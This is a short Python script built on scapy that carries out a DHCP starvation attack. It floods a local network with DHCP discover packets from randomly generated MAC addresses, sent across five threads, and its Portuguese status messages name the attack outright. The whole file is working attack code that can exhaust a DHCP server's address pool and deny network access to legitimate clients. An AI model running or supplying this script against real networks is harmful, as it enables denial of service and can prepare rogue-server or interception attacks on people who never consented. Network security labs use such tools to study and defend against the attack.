#!/usr/bin/env python3

import sys
import random
import threading
from scapy.all import *

# conf.checkIPAddr needs to be set to False.
# When conf.checkIPAddr the response IP isn't checked
# against sending IP address. Don't need to match.

conf.checkIPAddr = False

# Define interface
iface = "\\Device\\NPF_{01033333-9A12-46EB-AB0D-4061CB052CD4}"
print(f"[+] Enviando pacotes pela interface {iface}")

# Function to turn the MAC creation more realistic
# Source MAC address is a random MAC address

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


# Create DHCP discover with destination IP = broadcast
# Source IP address = 0.0.0.0
# Destination IP address = Broadcast
# Source port = 68 (DHCP / BOOTP Client)
# Destination port = 67 (DHCP / BOOTP Server)
# DHCP message type is discover

def create_dhcp_discover():
    mac = random_mac()
    print(f"[+] Usando MAC aleatório: {mac}")
    
    return Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
           IP(src="0.0.0.0", dst="255.255.255.255") / \
           UDP(sport=68, dport=67) / \
           BOOTP(op=1, chaddr=mac2str(mac)) / \
           DHCP(options=[("message-type", "discover"), "end"])

# Function to send packets in loop
def send_dhcp(num_packets):
    for i in range(num_packets):
        dhcp_discover = create_dhcp_discover()
        sendp(dhcp_discover, iface=iface, verbose=0)
        print(f"[+] Pacote {i+1}/{num_packets} enviado")

# Config the amount of packets and threads
num_packets = 100  # Quantidade total de pacotes a enviar
num_threads = 5    # Número de threads

# Create thread 
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_dhcp, args=(num_packets // num_threads,))
    t.start()
    threads.append(t)

# Wait until threads to be finished
try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\n[+] DHCP Starvation interrompido pelo usuário.")
